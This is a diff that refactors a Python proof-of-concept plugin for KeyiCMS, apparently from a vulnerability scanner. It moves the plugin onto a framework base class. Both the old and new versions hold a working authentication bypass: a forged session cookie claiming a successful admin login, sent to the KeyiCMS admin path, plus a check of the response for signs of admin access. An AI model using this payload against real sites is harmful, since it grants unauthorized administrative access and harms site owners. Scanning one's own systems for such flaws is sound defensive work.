@@ -3,41 +3,25 @@
 
 __author__ = 'xiaokong'
 
-import sys
-import requests
-from module.log import logger
+from module.plugin import Plugin
 
-
-description = 'KeyiCMS login in by Cookie whithout auth'
-querytype = 'site'
-type = 'CMS'
-cmsname = 'keyicms'
-
-class poc(object):
+class poc(Plugin):
     
-    def __init__(self, v):
+    type = 'CMS'
+    cmsname = 'keyicms'
+    querytype = 'site'
+    description = 'KeyiCMS login in by Cookie whithout auth'    
+
+    def __init__(self):
     
         self.payload = "ASPSESSIONIDSATDDSRR=LBIFPODBGDIKCHLMLINLNCGO; \
                 CompanyZY=LoginIP=192%2E168%2E90%2E1&AdminLoginCode=keyicms&LoginSystem=Succeed&AdminPurview=123&AdminName=123"
         self.path = '/Keyicms_System/Keyicms_Index.Asp?AdminAction=login'
-        self.logger = logger(v)
     
     def exploit(self, target):
         
-        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.0)','Cookie': self.payload}
-        try:
-            res = requests.get(target+self.path, headers=headers, timeout=30)
-            if not res.ok:
-                return True
-            data = res.content
-            if 'location.replace(\'Keyicms_Login.Asp\')' in data and 'href="Ky_Admin.Asp"' in data:
-                self.logger.log(41,str([target]))
-        except Exception as e:
-            self.logger.debug(str(e))
-
-    
-
-   
-
-
-
+        response = self.query(method='GET', url=target+self.path, cookie=self.payload)
+        if response:
+            if response.ok:
+                if 'location.replace(\'Keyicms_Login.Asp\')' in response.content and 'href="Ky_Admin.Asp"' in response.content:
+                    self.log.vuln(target)    
